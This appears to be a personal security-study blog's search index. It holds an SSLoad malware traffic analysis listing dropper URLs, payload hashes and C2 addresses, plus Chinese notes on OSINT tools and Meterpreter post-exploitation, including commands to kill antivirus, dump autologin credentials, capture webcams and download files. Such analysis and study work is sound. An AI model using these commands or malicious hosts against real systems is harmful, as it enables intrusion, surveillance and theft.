http://mmtixmm.org/65629679a60671570e93799683b05/case49308469q2097/court/out/367910732497/documents?t017538i87=0535008152&amp;i=qz&amp;dmc=www.scotchblue.com&amp;4666842q3&amp;cmp=horvitzlevy&amp;4721702y0 ASSOCIATED FAKE AZURE DOWNLOAD PAGE: https://mebumau.org/?4666842q3&amp;4721702y0&amp;cmp=horvitzlevy&amp;dmc=www.scotchblue.com&amp;i=qz&amp;t017538i87=0535008152 EXAMPLES OF FIREBASESTORAGE URLS FOR JS DOWNLOAD: https://firebasestorage.googleapis.com/v0/b/terfe-419414.appspot.com/o/I3Hl2Mxyqs%2FLetter_b23_98b161159-63t511248325-3676a8.js?alt=media&amp;token=a097d607-7759-4aaa-b6e2-bfe5c43df76e https://firebasestorage.googleapis.com/v0/b/terfe-419414.appspot.com/o/VbxHHBQUee%2FLetter_u79_20w517865-65u0451500340-7186n6.js?alt=media&amp;token=41e2b597-6b12-448a-92d1-9c770c818489 SHA256 EXAMPLES OF DOWNLOADED .JS FILES: 93a215b08cce42249341816df7a85edac12d4bcef166b15da64bb238637f6e76 Letter_b23_98b161159-63t511248325-3676a8.js 5fb093a9348fcf4a81befda978c948796a8319fcabe7899c2cf5ba1419ec9d35 Letter_u79_20w517865-65u0451500340-7186n6.js ABOVE .JS FILES RETRIEVE MSI FILE FROM THE FOLLOWING URL: file:\\globalsolutionunlimitedltd.com@80\\share\\sharepoint.msi DOWNLOADED MSI FILE: SHA256 hash: 90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750 File size: 1,725,952 bytes File location: file:\\globalsolutionunlimitedltd.com@80\\share\\sharepoint.msi &lt;– No longer online Sample available at: https://bazaar.abuse.ch/sample/90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750/ SSLOAD DLL INSTALLED AND RUN BY THE ABOVE MSI FILE: SHA256 hash: 09ffc4188bf11bf059b616491fcb8a09a474901581f46ec7f2c350fbda4e1e1c File size: 718.848 bytes File location: C:\\Users[username]\\AppData\\Local\\sharepoint\\MenuEx.dll Run method: regsvr32.exe /s [filename] Sample available at: https://bazaar.abuse.ch/sample/09ffc4188bf11bf059b616491fcb8a09a474901581f46ec7f2c350fbda4e1e1c/ Note: This malware is kept persistent by a scheduled task. POST-INFECTION TRAFFIC: https://t.me/+st2YadnCIU1iNmQy 85.239.53.219 port 80 - 85.239.53.219 - GET /api/g &lt;– encrypted payload port 443 - api.ipify.org - HTTPS traffic 85.239.53.219 port 80 - 85.239.53.219 - POST /api/gateway HTTP/1.1 , JSON (application/json) 85.239.53.219 port 80 - 85.239.53.219 - POST /api/b0408631-d621-61e4-7035-f7d17fc50af8/tasks HTTP/1.1 85.239.53.219 port 80 - 85.239.53.219 - GET /download?id=Cosmos&amp;module=2&amp;filename=None HTTP/1.1 知识参考","link":"/20240415-Malware/"},{"title":"OSINT","text":"OSINT 收集域名信息sublist3r利用OSINT技术枚举主域名的所有子域名 Maltego提取互联网上公开资料来收集个人信息 OSRFramework用于执行开源情报计划的工具 usufy用于多搜索引擎搜索、识别URL中的关键字，并自动列举和CSV格式存储所有结果 mailfy通过API调用在havaibeenpawned.com自动搜索 searchfy在Facebook、Github、Instagram、Twitter和Youtube中搜索关键词 Passive Total针对任何特定目标域名提供OSINT能力的另一个平台 网络爬虫 theHarvester脚本，进行搜索 获取用户信息 TinEye提供在线反向图像搜索门户网站 Shodan SpiderFoot Spyse ZoomEye Google Hacking 数据库用户密码列表cupp生成密码字典 自定义密码破解字典CeWL给定URL进行指定深度的爬取，返回一个字典列表用于密码破解 twofi从Twitter提取字典","link":"/OSINT/"},{"title":"Post-exploitation attack","text":"Information gathering 进程迁移在获得Meterpreter Shell后，如何进行下一步 使用命令ps查看正在运行的进程 使用getpid查看Meterpreter Shell的进程号 进程迁移：之后使用migrate命令将Shell移动到其他进程里面，或者使用 1run post/windows/manage/migrate 系统自动寻找合适的进程进行迁移 系统命令sysinfo命令查看目标机的系统信息使用命令 1run post/windows/gather/checkvm 来查看目标机是否运行再虚拟机上 命令idletime查看目标机最近运行时间 命令route查看路由信息 命令getuid查看当前目标机器上已经渗透成功的用户名 命令 1run post/windows/manage/killav 关闭目标机系统杀毒软件 命令 1run post/windows/manage/enable_rdp 启用目标机的远程桌面协议 3389端口 命令 1run post/windows/manage/autoroute 查看目标机本地子网情况 使用background将Meterpreter终端隐藏在后台，之后使用route add添加路由，可以使用route print查看 命令 1run post/windows/gather/enum_logged_on_users 列举当前多少用户登陆了目标机 命令 1run post/windows/gather/enum_applications 列举装在目标机上的应用 命令 1run windows/gather/credentials/windows_autologin 可以抓取自动登录的用户名和密码 屏幕截图命令 12load espiascreengrab or 1screenshot 命令 1webcam_list 查看有没有摄像头 命令 1webcam_snap 拍摄 命令 1webcam_stream 开启直播命令 1shell 进入目标机Shell 文件系统命令1234567pwd # 目标机目录get lwd # 查看当前处于本地哪个目录lscd search -f *.txt -d c:\\ # 查看C盘中所有以.txt为拓展名的文件download c:\\xxx /root # 将特定文件下载upload /root c: # 将文件上传","link":"/Post-exploitation-attack-information-gathering/"},{"title":"Post-exploitation attack","text":"Privilege escalation 纵向提权 and 横向提权Windows命令行 12shellwhoami /groups 当前组为Mandatory Label\\Medium Mandatory Level，为标准用户那么就需要升到管理员权限，也就是Mandatory Lable\\High Mandatory Level getuid查看已经获得的权限 并尝试使用getsystem发现失败了 进入shell使用systeminfo看看打了哪些补丁 尽量使用最新的的EXP进行提权 show options set session 1 貌似没成功","link":"/Post-exploitation-attack-privilege-escalation/"},{"title":"Welcome to My Blog","text":"Welcome to my first blog! I'm thrilled to embark on this journey where I'll be sharing my study experiences, code snippets, and insights into life. It's my pleasure to meet you all! Stay tuned as I continuously improve and enhance the functionality of this blog. As a beginner, if you have any questions or suggestions, please contacting me at any time via twitter. I will do my best to provide support.","link":"/first/"}],"tags":[{"name":"traffic","slug":"traffic","link":"/tags/traffic/"},{"name":"malware","slug":"malware","link":"/tags/malware/"},{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"study","slug":"study","link":"/tags/study/"},{"name":"penetration test","slug":"penetration-test","link":"/tags/penetration-test/"}],"categories":[{"name":"malware_traffic","slug":"malware-traffic","link":"/categories/malware-traffic/"},{"name":"traffic_analysis","slug":"traffic-analysis","link":"/categories/traffic-analysis/"},{"name":"penetration_test","slug":"penetration-test","link":"/categories/penetration-test/"},{"name":"explanation","slug":"explanation","link":"/categories/explanation/"}],"pages":[{"title":"about","text":"1","link":"/about/index.html"},{"title":"Life","text":"哎，博主已经肥的不行了，体力大不如以前了，于是决定开始减肥，每天记录体重，冲冲冲！ 2024-05-08最近太忙了，不定期更新，五一玩了波爽的。兰州烤肉、手抓肉太好吃辣！ 2024-04-17坏起来了 2024-04-16又胖了，肌肉又涨了，你nnd没抢到五一票！！！！！ 2024-04-15我靠，这两天晚上跑步，没瘦，发现肌肉涨了5斤，体脂率下去了一点T T 2024-04-14早上忘记测了T T 2024-04-13","link":"/life/index.html"}]}